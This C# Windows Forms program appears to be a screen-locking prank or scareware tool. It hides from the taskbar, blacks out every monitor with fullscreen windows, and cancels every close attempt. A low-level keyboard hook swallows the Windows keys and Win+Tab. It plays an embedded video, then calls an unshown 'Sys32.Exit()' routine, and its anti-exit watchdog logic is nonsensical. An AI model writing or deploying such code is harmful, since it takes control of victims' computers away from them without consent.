using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Generic
{

    public partial class Form1 : Form
    {
        private System.Windows.Forms.Timer pbTimer;
        private double trigger = 4.2;

        private Thread t;

        private static IntPtr _hookID = IntPtr.Zero;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int VK_TAB = 0x09;
        private const int VK_MENU = 0x12; // Alt key
        private const int VK_LWIN = 0x5B; // Left Windows key
        private const int VK_RWIN = 0x5C; // Right Windows key

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            return true;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public Form1()
        {
            InitializeComponent();

            ForcePreventExit();

            _hookID = SetHook(HookCallback);

            this.ShowInTaskbar = false;
            this.FormClosing += Form1_FormClosing;

            foreach (Screen screen in Screen.AllScreens)
            {
                CreateWindowForMonitor(screen);
            }

            axWMP.uiMode = "none"; // Hide controls

            // Extract the embedded video resource to a temporary file
            string tempFile = Path.Combine(Path.GetTempPath(), "embedded_video.mp4");

            // Write the resource to the temporary file
            File.WriteAllBytes(tempFile, Properties.Resources.video);

            axWMP.URL = tempFile;
            // Load and play the video in the media player

            axWMP.Location = new System.Drawing.Point(
                (this.ClientSize.Width - axWMP.Width) / 2,
                (this.ClientSize.Height - axWMP.Height) / 2
            );

            // playback timestamp tracker
            pbTimer = new System.Windows.Forms.Timer();
            pbTimer.Interval = 100;
            pbTimer.Tick += e_tick;
            pbTimer.Start();

        }

        private void e_tick(object sender, EventArgs e)
        {
            if (axWMP.playState == WMPLib.WMPPlayState.wmppsPlaying)
            {
                double current = axWMP.Ctlcontrols.currentPosition;

                if (current >= trigger)
                {
                    Sys32.Exit();
                    pbTimer.Stop();
                }
            }
        }

        private void CreateWindowForMonitor(Screen screen)
        {
            // Create a new form
            Form self = new Form();

            // Set properties for the new window
            self.ShowInTaskbar = false;
            self.FormClosing += Form1_FormClosing;
            self.StartPosition = FormStartPosition.Manual; // Allow manual positioning
            self.FormBorderStyle = FormBorderStyle.None;   // Optional: Remove the border
            self.WindowState = FormWindowState.Maximized; // Make it fullscreen
            self.BackColor = Color.Black;                 // Example background color

            // Position the form on the specified monitor
            self.Bounds = screen.Bounds;

            // Show the new window
            self.Show();
        }

        private void ForcePreventExit()
        {
            t = new Thread(() =>
            {
                while (true)
                {
                    // Check if the current process is running
                    Process[] processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);

                    // If the process is not running (unexpected), restart
                    if (processes.Length == 0)
                    {
                        Sys32.Exit();
                    }

                    Thread.Sleep(2000); // Check every 2 seconds
                }
            });

            t.IsBackground = true;
            t.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // do nothing
            e.Cancel = true;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);


                // Block Windows+Tab
                if (vkCode == VK_TAB && (Control.ModifierKeys & Keys.LWin) == Keys.LWin)
                {
                    return (IntPtr)1; // Block the key combination
                }

                if (vkCode == VK_TAB && (Control.ModifierKeys & Keys.RWin) == Keys.RWin)
                {
                    return (IntPtr)1; // Block the key combination
                }

                // Block standalone Windows keys to prevent Task View or Start Menu
                if (vkCode == VK_LWIN || vkCode == VK_RWIN)
                {
                    return (IntPtr)1; // Block the key
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            this.Activate();
        }
    }
}
